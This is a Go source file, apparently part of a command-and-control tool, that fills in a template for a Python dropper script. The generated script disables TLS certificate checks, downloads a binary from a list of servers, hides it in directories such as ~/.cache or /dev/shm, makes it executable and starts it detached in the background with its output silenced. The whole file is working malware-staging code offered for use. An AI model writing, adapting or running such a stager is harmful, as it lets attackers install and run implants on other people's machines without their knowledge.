package scriptgen

import (
	"bytes"
	"fmt"
	"rscc/internal/database/ent"
	"text/template"
)

var pyTemplate = `
import urllib.request
import urllib.error
import ssl
import os
import sys
import stat
import subprocess
import tempfile
import platform
from pathlib import Path

def download_file(url, filepath):
	try:
		ssl_context = ssl.create_default_context()
		ssl_context.check_hostname = False
		ssl_context.verify_mode = ssl.CERT_NONE
		
		request = urllib.request.Request(url)
		with urllib.request.urlopen(request, timeout=5, context=ssl_context) as response:
			with open(filepath, 'wb') as f:
				f.write(response.read())
		
		return True
	except Exception as e:
		return False

def get_save_directory():
	home = os.environ.get('HOME')
	
	if home:
		candidates = [
			os.path.join(home, '.cache'),
			os.path.join(home, '.config'), 
			os.path.join(home, '.local')
		]
		
		for candidate in candidates:
			if os.path.exists(candidate) and os.access(candidate, os.W_OK):
				return candidate
	
	if os.path.exists('/dev/shm') and os.access('/dev/shm', os.W_OK):
		return '/dev/shm'
	
	return tempfile.gettempdir()

def make_executable(filepath):
	try:
		current_mode = os.stat(filepath).st_mode
		os.chmod(filepath, current_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
		return True
	except Exception as e:
		return False

def run_in_background(filepath):
	try:
		try:
			print(f"Start {filepath} in background")
			with open(os.devnull, 'w') as devnull:
				subprocess.Popen([filepath], stdout=devnull, stderr=devnull, close_fds=True)
			return True
		except:
			pass
		
		try:
			cmd = ['nohup', filepath]
			print(f"nohup {filepath} >/dev/null 2>&1 &")
			with open(os.devnull, 'w') as devnull:
				subprocess.Popen(cmd, stdout=devnull, stderr=devnull, 
							preexec_fn=os.setsid if hasattr(os, 'setsid') else None)
			return True
		except FileNotFoundError:
			pass
		
		if hasattr(os, 'setsid'):
			try:
				print(f"setsid {filepath} >/dev/null 2>&1 &")
				with open(os.devnull, 'w') as devnull:
					subprocess.Popen([filepath], stdout=devnull, stderr=devnull, 
								preexec_fn=os.setsid)
				return True
			except:
				pass
		
		return True
	except Exception as e:
		return False

def main():
	if platform.system().lower() == 'windows':
		sys.exit(1)
	
	current_path = os.environ.get('PATH', '')
	additional_paths = ['/usr/local/sbin', '/usr/local/bin', '/usr/bin', '/bin', '/sbin']
	
	for path in additional_paths:
		if path not in current_path:
			current_path = f"{current_path}:{path}"
	
	os.environ['PATH'] = current_path
	
	save_dir = get_save_directory()
	filename = "{{ .Name }}"
	filepath = os.path.join(save_dir, filename)
	
	servers = [{{range .Servers}}"{{.}}",{{end}}]
	url_path = "{{ .URL }}"
	
	success = False
	
	if len(servers) > 1:
		for server in servers:
			url = f"https://{server}{url_path}"
			if download_file(url, filepath):
				success = True
				break
	else:
		if servers:
			url = f"https://{servers[0]}{url_path}"
			success = download_file(url, filepath)
	
	if not success or not os.path.exists(filepath):
		sys.exit(1)
	
	print(f"Downloaded to {filepath}")
	if not make_executable(filepath):
		pass
	
	if not run_in_background(filepath):
		sys.exit(1)

if __name__ == "__main__":
	main()
`

func GeneratePyScript(agent *ent.Agent) (string, error) {
	tmpl, err := template.New("py").Parse(pyTemplate)
	if err != nil {
		return "", fmt.Errorf("failed to parse py template: %w", err)
	}

	buf := bytes.Buffer{}
	if err := tmpl.Execute(&buf, agent); err != nil {
		return "", fmt.Errorf("failed to execute py template: %w", err)
	}

	return buf.String(), nil
}
